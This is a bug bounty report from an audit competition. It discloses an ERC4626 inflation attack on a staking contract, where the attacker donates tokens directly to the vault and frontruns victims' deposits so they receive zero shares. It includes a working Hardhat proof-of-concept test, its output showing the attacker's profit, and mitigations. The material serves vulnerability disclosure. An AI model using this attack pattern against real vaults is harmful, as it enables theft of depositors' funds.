# 57716 sc critical erc4626 inflation bug in staking contract

**Submitted on Oct 28th 2025 at 11:59:22 UTC by @Divine\_Dragon for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57716
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief / Intro

`Staking` contract inherits ERC4626, which by default has an inflation attack vulnerability for freshly deployed vaults with zero minted shares upon deployment.

### Vulnerability Details

An attacker can manipulate the asset-to-share ratio by directly transferring assets to the vault (funding the contract) instead of using the deposit function. The typical attack scenario is shown below.

{% stepper %}
{% step %}

### Attack Setup / Intuition

* The vault starts with virtual shares/assets behavior (e.g., initial minted shares may be zero).
* If an attacker first mints a tiny number of shares (e.g., deposit 1 asset => 1 share) and then donates a large amount of assets directly to the vault (no shares minted for that donation), the asset/share ratio is skewed.
* Subsequent honest deposits (victims) can be frontrun such that they receive zero or very few shares for large asset deposits due to rounding and virtual-share behavior.
* The attacker, holding real shares from the initial tiny deposit, can later redeem for a disproportionate amount of assets and eventually profit after repeating the pattern across multiple victims.
  {% endstep %}

{% step %}

### Example Numerical Flow

* Attacker deposits 1 asset:
  * Attacker shares = 1
  * total shares = 2 (because of virtual shares)
  * total assets = 2 (because of virtual assets)
* Victim intends to deposit 5000, but attacker frontruns by donating assets:
  * Attacker donates 10000 directly to vault (no shares minted)
  * total assets = 10002
  * total shares still = 2 (1 real + 1 virtual)
* Victim deposits 5000:
  * shares allotted ≈ 2 \* 5000 / 10002 ≈ 0 (due to integer rounding / virtual share behavior)
  * victim gets 0 shares, attacker remains with 1 share representing a larger portion of total assets
* After multiple victims, attacker redeems their 1 share and captures a large portion of the pooled assets, turning the initial apparent loss into profit.
  {% endstep %}
  {% endstepper %}

### Impact Details

For the attack to succeed, these conditions must be met:

* The deployed staking contract should not have minted any real shares previously (from the provided script, no initial minting occurred).
* No other user should stake more than (donated / 2) amount of assets to the vault.

Because of the above two conditions, the Severity was marked as Medium in the original assessment; however, this report is labeled Critical due to direct theft potential.

## Proof of Concept

<details>

<summary>Click to expand the PoC test case and test output</summary>

Include the below test case in `staking.test.ts`:

```
    it('BUG-1: ERC4626 inflation attack - multi-victim frontrun turns initial loss into profit', async () => {
      const { staking, long, admin, user1: attacker, user2: victim1 } = await loadFixture(fixture);

      // Additional victims (grab extra signers)
      const signers = await ethers.getSigners();
      const victim2 = signers[7];
      const victim3 = signers[8];

      const oneUnit = ethers.BigNumber.from('1');
      const donationAmount = ethers.utils.parseEther('10000');
      const victimDepositAmount = ethers.utils.parseEther('5000');

      // Step 1: Attacker deposits 1 unit to get 1 share
      await long.connect(admin).transfer(attacker.address, oneUnit.add(donationAmount));
      await long.connect(attacker).approve(staking.address, oneUnit.add(donationAmount));
      await staking.connect(attacker).deposit(oneUnit, attacker.address);
      expect(await staking.balanceOf(attacker.address)).to.eq(oneUnit);
      expect(await staking.totalSupply()).to.eq(oneUnit);

      // Step 2: Attacker donates 10000 LONG directly to the vault (no shares minted)
      await long.connect(attacker).transfer(staking.address, donationAmount);

      // Step 3: Victim 1 deposits 5000 LONG -> receives 0 shares due to virtual shares rounding
      await long.connect(admin).transfer(victim1.address, victimDepositAmount);
      await long.connect(victim1).approve(staking.address, victimDepositAmount);
      await staking.connect(victim1).deposit(victimDepositAmount, victim1.address);
      expect(await staking.balanceOf(victim1.address)).to.eq(0);

      // Step 4: Victim 2 deposits 5000 LONG -> receives 0 shares
      await long.connect(admin).transfer(victim2.address, victimDepositAmount);
      await long.connect(victim2).approve(staking.address, victimDepositAmount);
      await staking.connect(victim2).deposit(victimDepositAmount, victim2.address);
      expect(await staking.balanceOf(victim2.address)).to.eq(0);

      // Step 5: Victim 3 deposits 5000 LONG -> receives 0 shares
      await long.connect(admin).transfer(victim3.address, victimDepositAmount);
      await long.connect(victim3).approve(staking.address, victimDepositAmount);
      await staking.connect(victim3).deposit(victimDepositAmount, victim3.address);
      expect(await staking.balanceOf(victim3.address)).to.eq(0);

      // Step 6: After min stake period, attacker redeems
      await staking.connect(admin).setMinStakePeriod(1);

      const attackerShares = await staking.balanceOf(attacker.address);
      const attackerPreviewAssets = await staking.previewRedeem(attackerShares);
      // Expected ~12,501 LONG: (totalAssets 1 + 10000 + 5000*3 + 1 virtual) / (1 real share + 1 virtual)
      expect(attackerPreviewAssets).to.be.gt(ethers.utils.parseEther('12499'));
      expect(attackerPreviewAssets).to.be.lt(ethers.utils.parseEther('12502'));

      const attackerInitialSpent = oneUnit.add(donationAmount); // 10001
      const beforeRedeemBal = await long.balanceOf(attacker.address);
      const tx = await staking.connect(attacker).redeem(attackerShares, attacker.address, attacker.address);
      await expect(tx)
        .to.emit(staking, 'Withdraw')
        .withArgs(attacker.address, attacker.address, attacker.address, attackerPreviewAssets, attackerShares);

      const attackerFinalBalance = await long.balanceOf(attacker.address);
      const attackerNet = attackerFinalBalance.add(beforeRedeemBal).sub(attackerInitialSpent);
      console.log("Attafker Profit - ", attackerNet);
      // Attacker turns initial loss into profit after 3 victims
      expect(attackerNet).to.be.gt(0);
    });
```

Upon running the above test case, the following result was obtained:

```
$ npx hardhat test test/v2/platform/staking.test.ts --grep "BUG-1"

secp256k1 unavailable, reverting to browser version

  Staking
    Bug reproductions
Warning: Potentially unsafe deployment of contracts/v2/periphery/Staking.sol:Staking

    You are using the `unsafeAllow.constructor` flag.

Attafker Profit -  2500e18
      ✔ BUG-1: ERC4626 inflation attack - multi-victim frontrun turns initial loss into profit (1471ms)

  1 passing (1s)
```

</details>

## Notes / Recommendations (from original context)

* The root cause is ERC4626 vault behavior when shares are zero on deployment and direct transfers to the vault change assets without minting shares.
* Typical mitigations include ensuring initial share/asset handling is safe, preventing direct asset transfers from affecting share ratios (e.g., blocking transfers to the vault address, accounting for direct transfers in deposit/withdraw logic, or initializing the vault with proper initial shares/assets), and/or adding explicit checks to prevent deposits that would result in zero shares being minted to the depositor.

(End of report)
